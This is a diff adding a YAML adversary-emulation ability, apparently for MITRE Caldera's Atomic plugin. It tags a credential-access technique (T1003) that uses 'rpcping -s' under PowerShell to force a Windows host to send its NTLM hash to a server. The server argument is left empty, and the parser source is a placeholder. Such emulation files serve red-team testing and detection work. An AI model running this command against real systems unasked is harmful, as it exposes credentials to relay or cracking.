@@ -1,0 +1,19 @@
+---
+- id: 137075767ba5b96cb3e0ea66e32d8ab5
+  name: Send NTLM Hash with RPC Test Connection
+  description: "RpcPing command can be used to send an RPC test connection to the\
+    \ target server (-s) and force the NTLM hash to be sent in the process. \nRef:\
+    \ https://twitter.com/vysecurity/status/974806438316072960"
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: rpcping -s
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
